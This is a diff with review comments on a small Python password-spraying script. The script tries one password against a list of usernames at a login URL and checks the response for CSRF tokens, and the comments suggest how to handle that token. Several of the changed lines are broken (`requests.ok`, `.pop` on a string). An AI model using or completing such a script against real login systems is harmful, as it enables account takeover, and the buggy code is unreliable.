@@ -11,13 +11,16 @@ def passwordSpray(password: str, url: str) -> bool:
      \____|_|\__,_|___|___\____|_|  \__,_|___/\___|\__,_| \____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|\n\n""")
     
     for username in usernames:
-        username = username.strip() # redundant, bad data (also doesn't account for spaces in between) alternatively: username = username.replace(" ", "")
-        print(f"Trying:", {username})
+        username = username.replace(" ", "")
+        print(f"Trying:", {username})                                               # Interesting, I will investigate what is the best to call
         data = {"username": username,"password": password,"login":"submit"} # login value will only work for very few back-end oriented auth systems
         response = requests.post(url, data=data)
-        if not r.ok: # error does nothing here, response.text returns string value, would recommend using r.ok to evaluate if not 200 status code
+        if not requests.ok:
+            #Code here for debug, if I move unsuccessful passwords out, then the final list is self-documenting.
+            print(username.pop(username))
             pass
         if "csrf" in str(response.content):
+                                                    # I sorta get what you're saying here, but I don't understand the benefits. Am I correct to say, init the dictionary and then save headers response into that dict to be looked at further?
             print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
             return False
         else:
